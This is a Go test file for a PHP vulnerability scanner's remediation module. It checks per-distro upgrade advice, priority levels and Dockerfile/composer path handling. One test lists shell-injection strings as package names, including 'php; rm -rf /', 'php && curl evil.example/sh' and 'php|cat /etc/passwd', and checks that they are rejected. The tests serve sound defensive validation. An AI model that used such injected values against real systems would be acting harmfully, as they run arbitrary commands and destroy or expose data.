package remediate_test

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/yehezkiel1086/php2shell-check/internal/advisory"
	"github.com/yehezkiel1086/php2shell-check/internal/detect/path"
	"github.com/yehezkiel1086/php2shell-check/internal/inventory"
	"github.com/yehezkiel1086/php2shell-check/internal/match"
	"github.com/yehezkiel1086/php2shell-check/internal/remediate"
)

func mustLoadSeedAdvisory(t *testing.T) advisory.Advisory {
	t.Helper()
	adv, err := advisory.LoadEmbedded()
	if err != nil {
		t.Fatalf("LoadEmbedded() failed: %v", err)
	}
	return adv
}

func readGolden(t *testing.T, name string) string {
	t.Helper()
	p := filepath.Join("..", "..", "testdata", "remediate", name)
	data, err := os.ReadFile(p)
	if err != nil {
		t.Fatalf("read golden file %s: %v", name, err)
	}
	return strings.ReplaceAll(string(data), "\r\n", "\n")
}

func TestGoldenRemediationByDistroFamily(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)

	tests := []struct {
		name       string
		inst       inventory.PHPInstall
		verdict    match.Verdict
		fixedIn    string
		goldenFile string
	}{
		{
			name: "Debian FPM package",
			inst: inventory.PHPInstall{
				BinaryPath:      "/usr/sbin/php-fpm8.3",
				UpstreamVersion: "8.3.35",
				PackageManager:  "deb",
				PackageName:     "php8.3-fpm",
				PackageVersion:  "8.3.35-1+deb12u1",
				Distro:          inventory.Distro{ID: "debian", VersionID: "12"},
				SAPI:            inventory.SAPIFPM,
				Source:          inventory.SourceLocal,
			},
			verdict:    match.VerdictLikelyVulnerable,
			fixedIn:    "8.3.36",
			goldenFile: "debian_fpm.golden",
		},
		{
			name: "RHEL Apache module on 8.5",
			inst: inventory.PHPInstall{
				ModulePath:      "/usr/lib64/httpd/modules/libphp.so",
				UpstreamVersion: "8.5.11",
				PackageManager:  "rpm",
				PackageName:     "php",
				PackageVersion:  "8.5.11-1.el9",
				Distro:          inventory.Distro{ID: "rocky", VersionID: "9.4"},
				SAPI:            inventory.SAPIApache2Handler,
				Source:          inventory.SourceLocal,
			},
			verdict:    match.VerdictVulnerable,
			fixedIn:    "8.5.12",
			goldenFile: "rhel_apache.golden",
		},
		{
			name: "Alpine CLI package",
			inst: inventory.PHPInstall{
				BinaryPath:      "/usr/bin/php82",
				UpstreamVersion: "8.2.34",
				PackageManager:  "apk",
				PackageName:     "php82-cli",
				PackageVersion:  "8.2.34-r0",
				Distro:          inventory.Distro{ID: "alpine", VersionID: "3.20.3"},
				SAPI:            inventory.SAPICLI,
				Source:          inventory.SourceLocal,
			},
			verdict:    match.VerdictLikelyVulnerable,
			fixedIn:    "8.2.35",
			goldenFile: "alpine_cli.golden",
		},
		{
			name: "Container FPM install",
			inst: inventory.PHPInstall{
				BinaryPath:      "/usr/local/sbin/php-fpm",
				UpstreamVersion: "8.4.26",
				SAPI:            inventory.SAPIFPM,
				Source:          inventory.SourceImage,
			},
			verdict:    match.VerdictVulnerable,
			fixedIn:    "8.4.27",
			goldenFile: "container_fpm.golden",
		},
		{
			name: "cPanel EOL 7.4 FPM install",
			inst: inventory.PHPInstall{
				BinaryPath:      "/opt/cpanel/ea-php74/root/usr/sbin/php-fpm",
				UpstreamVersion: "7.4.33",
				PackageManager:  "rpm",
				PackageName:     "ea-php74-php-fpm",
				SAPI:            inventory.SAPIFPM,
				Source:          inventory.SourceLocal,
			},
			verdict:    match.VerdictLikelyVulnerable,
			fixedIn:    "",
			goldenFile: "cpanel_eol.golden",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			finding := match.Finding{
				AdvisoryID: adv.ID,
				CVEs:       adv.CVEs,
				Install:    tc.inst,
				Verdict:    tc.verdict,
				FixedIn:    tc.fixedIn,
			}
			rec := remediate.Build(finding, adv, remediate.Options{})
			got := remediate.FormatText(rec)
			want := readGolden(t, tc.goldenFile)
			if got != want {
				t.Fatalf("FormatText mismatch vs %s\ngot:\n%s\nwant:\n%s", tc.goldenFile, got, want)
			}
		})
	}
}

func TestMaliciousPackageNameIsRejectedAndNeverRendered(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)

	maliciousNames := []string{
		"php; rm -rf /",
		"php$(whoami)",
		"php`id`",
		"php && curl evil.example/sh",
		"php|cat /etc/passwd",
		"-oProxyCommand=evil",
		"PHP8.3-UPPERCASE",
		"",
	}

	for _, badPkg := range maliciousNames {
		t.Run(badPkg, func(t *testing.T) {
			t.Parallel()
			err := remediate.ValidatePackageToken(badPkg)
			if !errors.Is(err, remediate.ErrUnsafePackageToken) {
				t.Fatalf("ValidatePackageToken(%q) error = %v, want ErrUnsafePackageToken", badPkg, err)
			}

			if badPkg == "" {
				return
			}

			finding := match.Finding{
				AdvisoryID: adv.ID,
				CVEs:       adv.CVEs,
				Install: inventory.PHPInstall{
					BinaryPath:      "/usr/bin/php",
					UpstreamVersion: "8.3.35",
					PackageManager:  "deb",
					PackageName:     badPkg,
					Distro:          inventory.Distro{ID: "debian", VersionID: "12"},
					SAPI:            inventory.SAPIFPM,
					Source:          inventory.SourceLocal,
				},
				Verdict: match.VerdictVulnerable,
				FixedIn: "8.3.36",
			}

			rec := remediate.Build(finding, adv, remediate.Options{})
			if len(rec.Commands) != 0 {
				t.Fatalf("expected 0 commands when package name is malicious (%q), got: %+v", badPkg, rec.Commands)
			}
			for _, cmd := range rec.Commands {
				if strings.Contains(cmd.Text, badPkg) {
					t.Fatalf("malicious package name %q was rendered into command: %q", badPkg, cmd.Text)
				}
			}
		})
	}
}

func TestPriorityRulesAndUnknownVerdict(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)

	webSAPIs := []inventory.SAPI{
		inventory.SAPIApache2Handler,
		inventory.SAPIFPM,
		inventory.SAPICGI,
		inventory.SAPILiteSpeed,
		inventory.SAPIFrankenPHP,
	}

	for _, sapi := range webSAPIs {
		f := match.Finding{
			Install: inventory.PHPInstall{UpstreamVersion: "8.3.35", SAPI: sapi},
			Verdict: match.VerdictVulnerable,
			FixedIn: "8.3.36",
		}
		rec := remediate.Build(f, adv, remediate.Options{})
		if rec.Priority != remediate.PriorityP0 {
			t.Errorf("web SAPI %q Priority = %s, want P0", sapi, rec.Priority)
		}
	}

	cliFinding := match.Finding{
		Install: inventory.PHPInstall{UpstreamVersion: "8.3.35", SAPI: inventory.SAPICLI},
		Verdict: match.VerdictLikelyVulnerable,
		FixedIn: "8.3.36",
	}
	cliRec := remediate.Build(cliFinding, adv, remediate.Options{})
	if cliRec.Priority != remediate.PriorityP2 {
		t.Errorf("CLI SAPI Priority = %s, want P2", cliRec.Priority)
	}

	unknownFinding := match.Finding{
		Install: inventory.PHPInstall{BinaryPath: "/usr/bin/php-custom", SAPI: inventory.SAPIFPM},
		Verdict: match.VerdictUnknown,
	}
	unknownRec := remediate.Build(unknownFinding, adv, remediate.Options{})
	if unknownRec.Priority != remediate.PriorityP3 {
		t.Errorf("UNKNOWN verdict Priority = %s, want P3", unknownRec.Priority)
	}
	stepsJoined := strings.Join(unknownRec.Steps, "\n")
	if !strings.Contains(stepsJoined, "verify manually") {
		t.Errorf("UNKNOWN verdict steps missing 'verify manually': %s", stepsJoined)
	}
}

func TestDynamicHighestFixedInDerivationNeverHardcoded(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)
	tBool := true
	adv.Branches = append(adv.Branches, advisory.BranchAdvisory{
		Branch:               "8.6",
		FixedIn:              "8.6.4",
		UpstreamFixAvailable: &tBool,
	})

	eolFinding := match.Finding{
		Install: inventory.PHPInstall{UpstreamVersion: "8.1.30", SAPI: inventory.SAPIFPM},
		Verdict: match.VerdictLikelyVulnerable,
	}

	rec := remediate.Build(eolFinding, adv, remediate.Options{})
	stepsJoined := strings.Join(rec.Steps, "\n")
	if !strings.Contains(stepsJoined, "8.6 (>= 8.6.4)") {
		t.Fatalf("expected dynamically derived target '8.6 (>= 8.6.4)', got:\n%s", stepsJoined)
	}
}

func TestHuntHintsIncludedWhenEnabled(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)
	finding := match.Finding{
		Install: inventory.PHPInstall{UpstreamVersion: "8.3.35", SAPI: inventory.SAPIFPM},
		Verdict: match.VerdictVulnerable,
		FixedIn: "8.3.36",
	}

	rec := remediate.Build(finding, adv, remediate.Options{IncludeHuntHints: true})
	stepsJoined := strings.Join(rec.Steps, "\n")

	for _, want := range []string{
		"php2shell-",
		"PHP_SESSION_UPLOAD_PROGRESS",
		remediate.HuntDisclaimer,
	} {
		if !strings.Contains(stepsJoined, want) {
			t.Errorf("hunt hints missing %q\ngot:\n%s", want, stepsJoined)
		}
	}
}

func TestPathAndRemoteRemediationGuidance(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)

	pathFinding := match.Evaluate(inventory.PHPInstall{
		BinaryPath:      "Dockerfile:2",
		UpstreamVersion: "php:8.3-fpm",
		PackageManager:  "container",
		Source:          inventory.SourcePath,
		Confidence:      inventory.ConfidenceMedium,
	}, adv)
	pathRec := remediate.Build(pathFinding, adv, remediate.Options{})
	pathText := remediate.FormatText(pathRec)
	if !strings.Contains(pathText, "8.3.36") || !strings.Contains(pathText, "scan the resolved image digest") {
		t.Errorf("path remediation missing pin/digest guidance:\n%s", pathText)
	}

	remoteFinding := match.Evaluate(inventory.PHPInstall{
		BinaryPath:      "https://example.com/",
		UpstreamVersion: "8.3.10",
		Source:          inventory.SourceRemote,
		Confidence:      inventory.ConfidenceLow,
	}, adv)
	remoteRec := remediate.Build(remoteFinding, adv, remediate.Options{})
	remoteText := remediate.FormatText(remoteRec)
	if !strings.Contains(remoteText, "expose_php = Off") {
		t.Errorf("remote remediation missing expose_php=Off hardening:\n%s", remoteText)
	}
}

func assertGolden(t *testing.T, name, got string) {
	t.Helper()
	p := filepath.Join("..", "..", "testdata", "remediate", name)
	gotNorm := strings.ReplaceAll(got, "\r\n", "\n")
	if os.Getenv("UPDATE_GOLDEN") == "1" {
		if err := os.MkdirAll(filepath.Dir(p), 0o750); err != nil {
			t.Fatalf("mkdir golden dir: %v", err)
		}
		if err := os.WriteFile(p, []byte(gotNorm), 0o600); err != nil {
			t.Fatalf("write golden file %s: %v", name, err)
		}
	}
	want := readGolden(t, name)
	if gotNorm != want {
		t.Fatalf("FormatText mismatch vs %s\ngot:\n%s\nwant:\n%s", name, gotNorm, want)
	}
}

func TestPathModeGoldenAndInvariants(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)

	type pathCase struct {
		name       string
		files      map[string]string
		goldenFile string
		 floating   bool
	}

	cases := []pathCase{
		{
			name: "FROM docker.io/library/php:8-apache",
			files: map[string]string{
				"Dockerfile": "FROM docker.io/library/php:8-apache\n",
			},
			goldenFile: "path_8_apache.golden",
			floating:   true,
		},
		{
			name: "FROM php:8.3-apache",
			files: map[string]string{
				"Dockerfile": "FROM php:8.3-apache\n",
			},
			goldenFile: "path_8_3_apache.golden",
			floating:   true,
		},
		{
			name: "FROM php:8.3.35-apache",
			files: map[string]string{
				"Dockerfile": "FROM php:8.3.35-apache\n",
			},
			goldenFile: "path_8_3_35_apache.golden",
			floating:   false,
		},
		{
			name: "FROM php:8.3.36-apache",
			files: map[string]string{
				"Dockerfile": "FROM php:8.3.36-apache\n",
			},
			goldenFile: "path_8_3_36_apache.golden",
			floating:   false,
		},
		{
			name: "composer.json with ^8.2",
			files: map[string]string{
				"composer.json": "{\n  \"require\": {\n    \"php\": \"^8.2\"\n  }\n}\n",
			},
			goldenFile: "path_composer_8_2.golden",
			floating:   false,
		},
		{
			name: ".php-version containing 8.3.35",
			files: map[string]string{
				".php-version": "8.3.35\n",
			},
			goldenFile: "path_php_version_8_3_35.golden",
			floating:   false,
		},
		{
			name: "compose build context with Dockerfile",
			files: map[string]string{
				"Dockerfile":         "FROM php:8-apache\n",
				"docker-compose.yml": "services:\n  web:\n    build: .\n",
			},
			goldenFile: "path_compose_build.golden",
			floating:   true,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			dir := t.TempDir()
			for relPath, content := range tc.files {
				full := filepath.Join(dir, filepath.FromSlash(relPath))
				if err := os.MkdirAll(filepath.Dir(full), 0o750); err != nil {
					t.Fatalf("mkdir: %v", err)
				}
				if err := os.WriteFile(full, []byte(content), 0o600); err != nil {
					t.Fatalf("write %s: %v", relPath, err)
				}
			}

			col := path.NewCollector(path.Options{RootPath: dir})
			installs, err := col.Collect(context.Background())
			if err != nil {
				t.Fatalf("Collect: %v", err)
			}
			if len(installs) != 1 {
				t.Fatalf("expected 1 install, got %d: %+v", len(installs), installs)
			}

			finding := match.Evaluate(installs[0], adv)
			rec := remediate.Build(finding, adv, remediate.Options{})
			text := remediate.FormatText(rec)

			assertGolden(t, tc.goldenFile, text)

			// Invariant 1: no systemctl and no config diff in any path finding.
			if strings.Contains(text, "systemctl") {
				t.Errorf("path finding remediation must never contain systemctl:\n%s", text)
			}
			for _, forbidden := range []string{"--- a/php.ini", "+++ b/php.ini", "session.upload_progress.enabled", "fatal_error_backtraces"} {
				if strings.Contains(text, forbidden) {
					t.Errorf("path finding remediation must never contain config diff (%q):\n%s", forbidden, text)
				}
			}
			if finding.Verdict != match.VerdictPatched && !strings.Contains(text, remediate.PathMitigationNotice) {
				t.Errorf("path finding remediation missing %q:\n%s", remediate.PathMitigationNotice, text)
			}
			if !strings.Contains(text, remediate.PathRestartHint) {
				t.Errorf("path finding remediation missing %q:\n%s", remediate.PathRestartHint, text)
			}

			// Invariant 2: displayed refs never contain docker.io/library/.
			if strings.Contains(text, "docker.io/library/") {
				t.Errorf("displayed remediation text must never contain docker.io/library/:\n%s", text)
			}

			// Invariant 3: first remediation step for floating tags is the scan image command.
			if tc.floating {
				if len(rec.Steps) == 0 || !strings.HasPrefix(rec.Steps[0], "php2shell-check scan image ") {
					t.Errorf("first remediation step for floating tag must be scan image command, got: %v", rec.Steps)
				}
			}
		})
	}

	// Verify 8-apache lists all branches from the data file dynamically (never hardcoded).
	tBool := true
	customAdv := adv
	customAdv.Branches = append(append([]advisory.BranchAdvisory(nil), adv.Branches...), advisory.BranchAdvisory{
		Branch:               "8.6",
		FixedIn:              "8.6.2",
		UpstreamFixAvailable: &tBool,
	})
	f8 := match.Evaluate(inventory.PHPInstall{
		BinaryPath:      "Dockerfile:1",
		UpstreamVersion: "docker.io/library/php:8-apache",
		PackageManager:  "container",
		PackageName:     "docker.io/library/php",
		SAPI:            inventory.SAPIApache2Handler,
		Source:          inventory.SourcePath,
		Confidence:      inventory.ConfidenceMedium,
		Evidence:        []string{"Dockerfile:1 -> FROM docker.io/library/php:8-apache"},
	}, customAdv)
	rec8 := remediate.Build(f8, customAdv, remediate.Options{})
	text8 := remediate.FormatText(rec8)
	for _, wantTag := range []string{
		"php:8.2.35-apache",
		"php:8.3.36-apache",
		"php:8.4.27-apache",
		"php:8.5.12-apache",
		"php:8.6.2-apache",
		remediate.PathBranchChoiceNotice,
	} {
		if !strings.Contains(text8, wantTag) {
			t.Errorf("8-apache remediation missing %q:\n%s", wantTag, text8)
		}
	}

	// Cover additional path-mode branches: EOL container tag, major-only composer constraint,
	// patched .php-version, EOL .php-version, compose image evidence, and IncludeHuntHints.
	extraInstalls := []inventory.PHPInstall{
		{
			BinaryPath:      "Dockerfile:1",
			UpstreamVersion: "8.1.30",
			PackageManager:  "container",
			PackageName:     "php:8.1.30-apache",
			SAPI:            inventory.SAPIApache2Handler,
			Source:          inventory.SourcePath,
		},
		{
			BinaryPath:      "docker-compose.yml:3",
			UpstreamVersion: "8.3.35",
			PackageManager:  "container",
			SAPI:            inventory.SAPICLI,
			Source:          inventory.SourcePath,
			Evidence:        []string{"docker-compose.yml:3 -> image: php:8.3.35-cli"},
		},
		{
			BinaryPath:      "composer.json:3",
			UpstreamVersion: "^8",
			PackageManager:  "composer",
			Source:          inventory.SourcePath,
		},
		{
			BinaryPath:      ".php-version:1",
			UpstreamVersion: "8.3.36",
			SAPI:            inventory.SAPICLI,
			Source:          inventory.SourcePath,
		},
		{
			BinaryPath:      ".tool-versions:1",
			UpstreamVersion: "8.1.30",
			SAPI:            inventory.SAPICLI,
			Source:          inventory.SourcePath,
		},
		{
			BinaryPath:      "/usr/local/bin/php",
			UpstreamVersion: "8.3.35",
			SAPI:            inventory.SAPILiteSpeed,
			Source:          inventory.SourceLocal,
		},
		{
			BinaryPath:      "/usr/bin/frankenphp",
			UpstreamVersion: "8.3.36",
			SAPI:            inventory.SAPIFrankenPHP,
			Source:          inventory.SourceRemote,
		},
	}
	for _, inst := range extraInstalls {
		f := match.Evaluate(inst, adv)
		r := remediate.Build(f, adv, remediate.Options{IncludeHuntHints: true})
		if r.Title == "" {
			t.Errorf("empty title for %+v", inst)
		}
	}
}
